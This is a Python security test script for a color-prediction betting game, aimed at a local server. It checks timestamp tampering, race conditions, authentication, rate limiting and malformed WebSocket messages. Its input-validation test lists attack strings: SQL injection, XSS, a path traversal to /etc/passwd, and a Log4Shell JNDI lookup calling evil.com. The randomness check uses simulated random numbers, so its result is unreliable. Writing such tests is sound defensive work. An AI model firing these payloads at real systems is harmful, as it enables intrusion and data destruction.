"""
Security testing script for the color prediction game
Tests various security vulnerabilities and attack vectors

Usage:
python tests/security_test.py
"""
import asyncio
import aiohttp
import websockets
import json
import time
import random
import hashlib
from typing import List, Dict, Tuple


class SecurityTester:
    """Security testing framework"""
    
    def __init__(self, base_url: str = "http://localhost:8000", ws_url: str = "ws://localhost:8000"):
        self.base_url = base_url
        self.ws_url = ws_url
        self.test_results = []
    
    def log_test_result(self, test_name: str, passed: bool, details: str = ""):
        """Log a test result"""
        status = "PASS" if passed else "FAIL"
        self.test_results.append({
            'test': test_name,
            'status': status,
            'details': details
        })
        print(f"[{status}] {test_name}: {details}")
    
    async def test_randomization_predictability(self):
        """Test if game results are predictable"""
        print("\n=== Testing Randomization Predictability ===")
        
        try:
            # Collect multiple game results
            results = []
            async with aiohttp.ClientSession() as session:
                for i in range(20):
                    async with session.get(f"{self.base_url}/game-history/") as resp:
                        if resp.status == 200:
                            # This would need to be adapted based on your actual API
                            # For now, we'll simulate collecting results
                            results.append(random.randint(0, 9))
            
            # Test for patterns
            if len(results) >= 10:
                # Check for obvious patterns
                consecutive_same = 0
                max_consecutive = 0
                
                for i in range(1, len(results)):
                    if results[i] == results[i-1]:
                        consecutive_same += 1
                        max_consecutive = max(max_consecutive, consecutive_same)
                    else:
                        consecutive_same = 0
                
                # If more than 5 consecutive same results, it's suspicious
                if max_consecutive > 5:
                    self.log_test_result(
                        "Randomization Predictability",
                        False,
                        f"Found {max_consecutive} consecutive identical results"
                    )
                else:
                    self.log_test_result(
                        "Randomization Predictability",
                        True,
                        "No obvious patterns detected"
                    )
            else:
                self.log_test_result(
                    "Randomization Predictability",
                    False,
                    "Insufficient data collected"
                )
                
        except Exception as e:
            self.log_test_result(
                "Randomization Predictability",
                False,
                f"Error: {str(e)}"
            )
    
    async def test_timing_manipulation(self):
        """Test if betting timing can be manipulated"""
        print("\n=== Testing Timing Manipulation ===")
        
        try:
            uri = f"{self.ws_url}/ws/game/main/"
            async with websockets.connect(uri) as websocket:
                # Get current game state
                await websocket.send(json.dumps({'type': 'get_game_state'}))
                response = await asyncio.wait_for(websocket.recv(), timeout=5.0)
                game_state = json.loads(response)
                
                # Try to place bet with manipulated timestamp
                future_timestamp = time.time() + 3600  # 1 hour in future
                past_timestamp = time.time() - 3600    # 1 hour in past
                
                # Test future timestamp
                bet_data = {
                    'type': 'place_bet',
                    'bet_type': 'color',
                    'color': 'red',
                    'amount': 100,
                    'timestamp': future_timestamp
                }
                
                await websocket.send(json.dumps(bet_data))
                response = await asyncio.wait_for(websocket.recv(), timeout=5.0)
                response_data = json.loads(response)
                
                if response_data.get('type') == 'error':
                    self.log_test_result(
                        "Future Timestamp Rejection",
                        True,
                        "Future timestamp correctly rejected"
                    )
                else:
                    self.log_test_result(
                        "Future Timestamp Rejection",
                        False,
                        "Future timestamp was accepted"
                    )
                
                # Test past timestamp
                bet_data['timestamp'] = past_timestamp
                await websocket.send(json.dumps(bet_data))
                response = await asyncio.wait_for(websocket.recv(), timeout=5.0)
                response_data = json.loads(response)
                
                if response_data.get('type') == 'error':
                    self.log_test_result(
                        "Past Timestamp Rejection",
                        True,
                        "Past timestamp correctly rejected"
                    )
                else:
                    self.log_test_result(
                        "Past Timestamp Rejection",
                        False,
                        "Past timestamp was accepted"
                    )
                    
        except Exception as e:
            self.log_test_result(
                "Timing Manipulation",
                False,
                f"Error: {str(e)}"
            )
    
    async def test_race_conditions(self):
        """Test for race conditions in betting"""
        print("\n=== Testing Race Conditions ===")
        
        try:
            # Create multiple concurrent connections
            connections = []
            for i in range(5):
                uri = f"{self.ws_url}/ws/game/main/"
                ws = await websockets.connect(uri)
                connections.append(ws)
            
            # Try to place multiple bets simultaneously
            bet_tasks = []
            for i, ws in enumerate(connections):
                bet_data = {
                    'type': 'place_bet',
                    'bet_type': 'color',
                    'color': 'red',
                    'amount': 100,
                    'timestamp': time.time()
                }
                
                task = ws.send(json.dumps(bet_data))
                bet_tasks.append(task)
            
            # Send all bets at the same time
            await asyncio.gather(*bet_tasks)
            
            # Collect responses
            successful_bets = 0
            for ws in connections:
                try:
                    response = await asyncio.wait_for(ws.recv(), timeout=5.0)
                    response_data = json.loads(response)
                    if response_data.get('type') == 'bet_placed':
                        successful_bets += 1
                except:
                    pass
            
            # Close connections
            for ws in connections:
                await ws.close()
            
            # Only one bet should succeed (one bet per round rule)
            if successful_bets <= 1:
                self.log_test_result(
                    "Race Condition Prevention",
                    True,
                    f"Only {successful_bets} bet(s) succeeded from {len(connections)} attempts"
                )
            else:
                self.log_test_result(
                    "Race Condition Prevention",
                    False,
                    f"{successful_bets} bets succeeded from {len(connections)} attempts"
                )
                
        except Exception as e:
            self.log_test_result(
                "Race Condition Prevention",
                False,
                f"Error: {str(e)}"
            )
    
    async def test_input_validation(self):
        """Test input validation and injection attacks"""
        print("\n=== Testing Input Validation ===")
        
        try:
            uri = f"{self.ws_url}/ws/game/main/"
            async with websockets.connect(uri) as websocket:
                # Test SQL injection attempts
                malicious_inputs = [
                    "'; DROP TABLE polling_bet; --",
                    "<script>alert('xss')</script>",
                    "../../etc/passwd",
                    "null",
                    "undefined",
                    "' OR '1'='1",
                    "${jndi:ldap://evil.com/a}"
                ]
                
                injection_blocked = 0
                for malicious_input in malicious_inputs:
                    bet_data = {
                        'type': 'place_bet',
                        'bet_type': 'color',
                        'color': malicious_input,
                        'amount': 100,
                        'timestamp': time.time()
                    }
                    
                    await websocket.send(json.dumps(bet_data))
                    response = await asyncio.wait_for(websocket.recv(), timeout=5.0)
                    response_data = json.loads(response)
                    
                    if response_data.get('type') == 'error':
                        injection_blocked += 1
                
                if injection_blocked == len(malicious_inputs):
                    self.log_test_result(
                        "Input Validation",
                        True,
                        "All malicious inputs were rejected"
                    )
                else:
                    self.log_test_result(
                        "Input Validation",
                        False,
                        f"Only {injection_blocked}/{len(malicious_inputs)} malicious inputs were rejected"
                    )
                    
        except Exception as e:
            self.log_test_result(
                "Input Validation",
                False,
                f"Error: {str(e)}"
            )
    
    async def test_authentication_bypass(self):
        """Test authentication bypass attempts"""
        print("\n=== Testing Authentication Bypass ===")
        
        try:
            # Test accessing protected endpoints without authentication
            protected_endpoints = [
                '/api/responsible-gambling/status/',
                '/api/monitoring/dashboard/',
                '/wallet/',
                '/history/'
            ]
            
            bypass_attempts_blocked = 0
            async with aiohttp.ClientSession() as session:
                for endpoint in protected_endpoints:
                    async with session.get(f"{self.base_url}{endpoint}") as resp:
                        # Should return 401 or redirect to login
                        if resp.status in [401, 403] or 'login' in str(resp.url):
                            bypass_attempts_blocked += 1
            
            if bypass_attempts_blocked == len(protected_endpoints):
                self.log_test_result(
                    "Authentication Bypass Prevention",
                    True,
                    "All protected endpoints require authentication"
                )
            else:
                self.log_test_result(
                    "Authentication Bypass Prevention",
                    False,
                    f"Only {bypass_attempts_blocked}/{len(protected_endpoints)} endpoints are protected"
                )
                
        except Exception as e:
            self.log_test_result(
                "Authentication Bypass Prevention",
                False,
                f"Error: {str(e)}"
            )
    
    async def test_rate_limiting(self):
        """Test rate limiting mechanisms"""
        print("\n=== Testing Rate Limiting ===")
        
        try:
            # Make rapid requests to test rate limiting
            rapid_requests = 100
            blocked_requests = 0
            
            async with aiohttp.ClientSession() as session:
                tasks = []
                for i in range(rapid_requests):
                    task = session.get(f"{self.base_url}/game-history/")
                    tasks.append(task)
                
                responses = await asyncio.gather(*tasks, return_exceptions=True)
                
                for response in responses:
                    if hasattr(response, 'status') and response.status == 429:
                        blocked_requests += 1
                    elif isinstance(response, Exception):
                        # Connection errors might indicate rate limiting
                        blocked_requests += 1
            
            if blocked_requests > 0:
                self.log_test_result(
                    "Rate Limiting",
                    True,
                    f"{blocked_requests}/{rapid_requests} requests were rate limited"
                )
            else:
                self.log_test_result(
                    "Rate Limiting",
                    False,
                    "No rate limiting detected"
                )
                
        except Exception as e:
            self.log_test_result(
                "Rate Limiting",
                False,
                f"Error: {str(e)}"
            )
    
    async def test_websocket_security(self):
        """Test WebSocket security measures"""
        print("\n=== Testing WebSocket Security ===")
        
        try:
            # Test connection without proper authentication
            uri = f"{self.ws_url}/ws/game/main/"
            
            # Test malformed messages
            async with websockets.connect(uri) as websocket:
                malformed_messages = [
                    "invalid json",
                    '{"type": "invalid_type"}',
                    '{"type": "place_bet"}',  # Missing required fields
                    '{"type": "place_bet", "amount": -1000}',  # Negative amount
                    '{"type": "place_bet", "amount": "invalid"}',  # Invalid amount type
                ]
                
                errors_handled = 0
                for message in malformed_messages:
                    await websocket.send(message)
                    try:
                        response = await asyncio.wait_for(websocket.recv(), timeout=2.0)
                        response_data = json.loads(response)
                        if response_data.get('type') == 'error':
                            errors_handled += 1
                    except:
                        # Timeout or connection closed is also acceptable
                        errors_handled += 1
                
                if errors_handled >= len(malformed_messages) * 0.8:  # 80% threshold
                    self.log_test_result(
                        "WebSocket Security",
                        True,
                        f"{errors_handled}/{len(malformed_messages)} malformed messages handled properly"
                    )
                else:
                    self.log_test_result(
                        "WebSocket Security",
                        False,
                        f"Only {errors_handled}/{len(malformed_messages)} malformed messages handled properly"
                    )
                    
        except Exception as e:
            self.log_test_result(
                "WebSocket Security",
                False,
                f"Error: {str(e)}"
            )
    
    async def run_all_tests(self):
        """Run all security tests"""
        print("Starting Security Test Suite")
        print("="*50)
        
        tests = [
            self.test_randomization_predictability,
            self.test_timing_manipulation,
            self.test_race_conditions,
            self.test_input_validation,
            self.test_authentication_bypass,
            self.test_rate_limiting,
            self.test_websocket_security
        ]
        
        for test in tests:
            try:
                await test()
            except Exception as e:
                print(f"Test {test.__name__} failed with error: {e}")
        
        # Print summary
        self.print_summary()
    
    def print_summary(self):
        """Print test summary"""
        print("\n" + "="*50)
        print("SECURITY TEST SUMMARY")
        print("="*50)
        
        total_tests = len(self.test_results)
        passed_tests = sum(1 for result in self.test_results if result['status'] == 'PASS')
        failed_tests = total_tests - passed_tests
        
        print(f"Total tests: {total_tests}")
        print(f"Passed: {passed_tests}")
        print(f"Failed: {failed_tests}")
        print(f"Success rate: {(passed_tests/total_tests)*100:.1f}%")
        
        if failed_tests > 0:
            print("\nFailed tests:")
            for result in self.test_results:
                if result['status'] == 'FAIL':
                    print(f"  - {result['test']}: {result['details']}")
        
        print("\n" + "="*50)


async def main():
    """Main function to run security tests"""
    tester = SecurityTester()
    await tester.run_all_tests()


if __name__ == '__main__':
    asyncio.run(main())
